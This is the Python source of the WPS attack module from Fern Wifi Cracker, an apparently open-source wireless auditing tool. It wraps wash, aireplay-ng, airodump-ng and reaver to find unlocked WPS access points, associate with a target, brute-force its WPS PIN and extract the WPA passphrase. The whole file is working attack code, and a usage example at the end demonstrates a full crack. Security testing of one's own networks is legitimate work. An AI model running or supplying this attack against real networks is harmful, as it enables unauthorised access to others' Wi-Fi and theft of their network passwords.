#-------------------------------------------------------------------------------
# Name:        WPS Core
# Purpose:     For WPS Attacks using the (Reaver) tool
#
# Author:      Saviour Emmanuel Ekiko
#
# Created:     03/09/2012
# Copyright:   (c) Fern Wifi Cracker 2012
# Licence:     <GNU GPL v3>
#
#
#-------------------------------------------------------------------------------
# GNU GPL v3 Licence Summary:
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import re
import time
import thread
import signal
import commands
import subprocess
import webbrowser

from PyQt4 import QtCore

class WPS_Attack(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)
        self.monitor_interface = str()      # Monitor Interface used for scanning
        self.monitor_mac_address = str()    # MAC Address of monitor interface
        self.victim_MAC_Addr = str()        # Victim Access Point MAC Address
        self.progress = str()               # Progress as in 40%
        self._scan_control = True           # For stopping scanning processes
        self._attack_control = True         # For stopping WPS attacks
        self._associate_flag = False        # False if not associated with WPS access point
        self.bruteforce_sys_proc = object   # Bruteforce object (type() == subprocess)
        self._wps_clients = []              # for holding the mac addresses of WPS enabled Access Points
        self._wps_client_info = {}          # for holding mac address information with channel

        self._wps_pin = str()               # Used by the get_keys() method for process keys
        self._final_key = str()

        self.reaver_link = "http://code.google.com/p/reaver-wps/downloads/list"


    def reaver_Installed(self):
        '''Checks if the reaver tool is installed'''
        sys_proc_a = "which reaver"
        sys_proc_b = "which wash"
        return_code_1 = commands.getstatusoutput(sys_proc_a)[0]
        return_code_2 = commands.getstatusoutput(sys_proc_b)[0]

        if(bool(return_code_1 or return_code_2)):
            return(False)
        return(True)


    def is_WPS_Device(self,ap_mac_addr):
        '''Checks if Device is WPS enabled'''
        if(ap_mac_addr.upper() in self._wps_clients):
            return(True)
        if(ap_mac_addr.lower() in self._wps_clients):
            return(True)
        return(False)


    def browse_Reaver_Link(self):
        webbrowser.open(self.reaver_link)


    ################### ATTACK AND SCAN SECTION ##########################

    def _scan_WPS_Devices_Worker(self):
        regex = re.compile("([0-9a-f]{2}:){5}[0-9a-f]{2}",re.IGNORECASE)
        sys_proc = subprocess.Popen("sudo wash -i %s -C" % (self.monitor_interface) ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        sys_file = sys_proc.stdout
        while(self._scan_control):
            response = sys_file.readline()
            if(regex.match(str(response))):
                information = response.split()
                MAC_Address = information[0].upper()
                Channel = information[1]
                is_WPS_Locked = information[4].upper()
                if(is_WPS_Locked == 'NO'):
                    self._wps_clients.append(MAC_Address)
                    self._wps_client_info[MAC_Address] = Channel



    def _associate_WPS_Device_Aireplay(self):
        thread.start_new_thread(self._start_Airodump,())
        time.sleep(2)
        while(self._attack_control):
            subprocess.Popen('aireplay-ng -1 0 -a %s -h %s %s'%(self.victim_MAC_Addr,self.monitor_mac_address,self.monitor_interface),shell=True,
            stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            time.sleep(2)
            if(self._associate_flag):
                return



    def _start_Airodump(self):
        subprocess.Popen("airodump-ng -c %s %s" % (self._wps_client_info[self.victim_MAC_Addr.upper()],self.monitor_interface),
        shell=True,cwd="/tmp/",stdout=subprocess.PIPE,stderr=subprocess.PIPE)


    def _bruteforce_WPS_Device(self):
        channel = self._wps_client_info[self.victim_MAC_Addr.upper()]
        wps_key_regex = re.compile(": '(\S+)'",re.IGNORECASE)
        wps_pin_regex = re.compile("WPS PIN: '(\d+)'",re.IGNORECASE)
        progress_regex = re.compile("(\d+\.\d+)%",re.IGNORECASE)
        associate_regex = re.compile("associated with",re.IGNORECASE)

        self.bruteforce_sys_proc = subprocess.Popen("reaver -i %s -b %s -c %s -a -N -L" %(self.monitor_interface,self.victim_MAC_Addr,channel),
        shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        self.bruteforce_sys_proc.stdin.write('y')                   # Restore previous session if any
        sys_file = self.bruteforce_sys_proc.stdout

        while(self._attack_control):
            responce = sys_file.readline()
            if(associate_regex.findall(str(responce))):
                self._associate_flag = True
                self.emit(QtCore.SIGNAL("Bruteforcing WPS Device"))

            information = progress_regex.findall(str(responce))
            if(bool(information)):
                self.progress = information[0]
                self.emit(QtCore.SIGNAL("WPS Progress"))
                self._associate_flag = True

            wps_pin = wps_pin_regex.findall(str(responce))
            if(bool(wps_pin)):
                self._wps_pin = wps_pin[0]
                self.emit(QtCore.SIGNAL("Cracked WPS Pin"))

            wps_key = wps_key_regex.findall(str(responce))
            if(bool(wps_key)):
                if(str(wps_key[0]) != str(self._wps_pin)):
                    self._final_key = wps_key[0]
                    self.emit(QtCore.SIGNAL("Cracked WPS Key"))
                    return


    def get_keys(self):
        keys = tuple([self._wps_pin,self._final_key])
        return(keys)


    def is_Attack_Finished(self):
        if(bool(self._final_key)):
            return(True)
        if(bool(self._wps_pin)):
            return(True)
        return(False)


    def start_Attack_WPS_Device(self):
        self._attack_control = True
        self._final_key = str()
        self._wps_pin = str()
        self._associate_flag = False
        self.emit(QtCore.SIGNAL("Associating with WPS device"))
        thread.start_new_thread(self._associate_WPS_Device_Aireplay,())
        time.sleep(3)
        self._bruteforce_WPS_Device()


    def stop_Attack_WPS_Device(self):
        self._attack_control = False
        self.bruteforce_sys_proc.kill                       # Save bruteforce session on keyboradinterrupt (CTRL - C)
        subprocess.Popen("killall aireplay-ng",shell=True)
        subprocess.Popen("killall reaver",shell=True)
        subprocess.Popen("killall airodump-ng",shell=True)


    def start_WPS_Devices_Scan(self):
        self._scan_control = True
        thread.start_new_thread(self._scan_WPS_Devices_Worker,())


    def stop_WPS_Scanning(self):
        self._scan_control = False
        subprocess.Popen("killall wash",shell=True)


    def run(self):
        self.start_Attack_WPS_Device()




# Usage

# instance = WPS_Attack()

# instance.monitor_interface = "mon0"
# instance.monitor_mac_address = "00:CA:56:C4:09:A1"

# instance.victim_MAC_Addr = "00:E5:56:C4:09:C3"
# print(instance.progress)                          # Percentage progress e.g 20%
# instance.start_WPS_Devices_Scan()

# instance.start()

# if(instance.is_Attack_Finished()):
#    print(instance.get_keys())                     # (123456789,"my_wpa_password")

# instance.terminate()


